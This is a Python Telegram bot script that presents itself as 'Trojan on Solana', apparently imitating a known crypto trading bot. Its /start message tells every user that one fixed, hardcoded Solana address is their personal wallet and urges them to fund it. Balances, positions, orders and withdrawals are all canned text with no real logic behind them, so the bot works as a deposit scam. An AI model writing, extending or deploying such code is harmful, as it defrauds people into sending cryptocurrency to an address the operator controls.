import logging
import os
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Set up logging to monitor errors and debug information
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# Define the main menu keyboard
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Buy", callback_data="buy"),
            InlineKeyboardButton("Sell", callback_data="sell"),
        ],
        [
            InlineKeyboardButton("Positions", callback_data="positions"),
            InlineKeyboardButton("Limit Orders", callback_data="limit_orders"),
        ],
        [
            InlineKeyboardButton("Referrals", callback_data="referrals"),
            InlineKeyboardButton("Withdraw", callback_data="withdraw"),
        ],
        [
            InlineKeyboardButton("Copy Trade", callback_data="copy_trade"),
            InlineKeyboardButton("Settings", callback_data="settings"),
        ],
        [InlineKeyboardButton("Help", callback_data="help")],
    ])

# Function to handle the /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    video_path = "WhatsApp Video 2024-12-03 at 12.58.12 AM.mp4"  # Relative path

    try:
        if os.path.exists(video_path):
            with open(video_path, 'rb') as video_file:
                await context.bot.send_video(
                    chat_id=update.effective_chat.id,
                    video=video_file,
                    caption="Welcome to Trojan on Solana! 🎥"
                )
        else:
            logger.error(f"Video file not found at {video_path}")
            await update.message.reply_text("Error: Welcome video not available.")
            return
    except Exception as e:
        logger.error(f"Error sending video: {e}")
        await update.message.reply_text("Error: Could not send video.")

    # Send the welcome text
    welcome_message = (
        "Introducing a cutting-edge bot crafted exclusively for Solana Traders. "
        "Trade any token instantly right after launch.\n\n"
        "Here's your Solana wallet address linked to your Telegram account. "
        "Simply fund your wallet and dive into trading.\n\n"
        "Solana Wallet Address:\n"
        "AVXRzamEeoLD5vUUwdauK8928KPJ9iFuR163SYh28vy1\n\n"
        "TAP TO COPY\n\n"
        "Balance: (0.00) SOL\n\n"
        "Click on the Refresh button to update your current balance.\n\n"
        "Join our Telegram group @trojan for users of Trojan!\n\n"
        "Use the following bots for faster trading:\n"
        "@achilles_trojanbot | @odysseus_trojanbot | @Menelaus_trojanbot | "
        "@Diomedes_trojanbot | @Paris_trojanbot | @Helenus_trojanbot | @Hector_trojanbot"
    )
    await update.message.reply_text(welcome_message, reply_markup=main_menu_keyboard())

# Individual functions for each menu button
async def buy_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "Buy $SLND- (Solend) 📈\n\n"
        "Balance: -_- SOL - W1 ✏️\n\n"
        "Price: $0.3594 - LIQ: $17.48K - MC: $35.94M\n\n"
        "🔴 Insufficient balance for buy amount + gas."
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())

async def sell_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "Sell $SLND- (Solend) 📉\n\n"
        "Balance: 2.419 SOL\n\n"
        "Price: $0.3594 - LIQ: $17.48K - MC: $35.94M\n\n"
        "Ready to sell? Please confirm the amount."
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())

async def positions_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "Current Positions 📊\n\n"
        "1. Position 1: $100 - Profit/Loss: +$5\n"
        "2. Position 2: $200 - Profit/Loss: -$10\n\n"
        "Total Profit/Loss: -$5"
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())

async def limit_orders_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "Active Limit Orders 🔒\n\n"
        "1. Order: 100 SOL at $0.35\n"
        "2. Order: 50 SOL at $0.40\n\n"
        "Total Pending Orders: 2"
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())

async def referrals_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "Your Referral Link 🧑‍💻\n\n"
        "Invite others and earn rewards!\n\n"
        "Referral Link: https://yourreferral.link"
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())

async def withdraw_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "Withdraw Funds 💸\n\n"
        "Enter the amount you wish to withdraw.\n\n"
        "Available Balance: 2.419 SOL"
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())

async def copy_trade_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "Copy Trade Feature 📲\n\n"
        "Copy other traders' successful trades with one click!\n\n"
        "To get started, choose a trader to copy."
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())

async def settings_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "Settings ⚙️\n\n"
        "Here you can adjust your bot settings.\n\n"
        "Choose an option to customize your experience."
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())

async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "Need Help? 🤔\n\n"
        "If you're facing issues or need assistance, feel free to ask here. "
        "You can contact our support team or join our Telegram group for updates."
    )
    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())

# Function to start the bot using polling
def run_bot():
    token = os.getenv("TELEGRAM_BOT_TOKEN")  # Use an environment variable
    if not token:
        raise ValueError("Bot token not set. Set TELEGRAM_BOT_TOKEN environment variable.")

    application = Application.builder().token(token).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))

    # CallbackQuery Handlers
    application.add_handler(CallbackQueryHandler(buy_handler, pattern="^buy$"))
    application.add_handler(CallbackQueryHandler(sell_handler, pattern="^sell$"))
    application.add_handler(CallbackQueryHandler(positions_handler, pattern="^positions$"))
    application.add_handler(CallbackQueryHandler(limit_orders_handler, pattern="^limit_orders$"))
    application.add_handler(CallbackQueryHandler(referrals_handler, pattern="^referrals$"))
    application.add_handler(CallbackQueryHandler(withdraw_handler, pattern="^withdraw$"))
    application.add_handler(CallbackQueryHandler(copy_trade_handler, pattern="^copy_trade$"))
    application.add_handler(CallbackQueryHandler(settings_handler, pattern="^settings$"))
    application.add_handler(CallbackQueryHandler(help_handler, pattern="^help$"))

    logger.info("Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    run_bot()
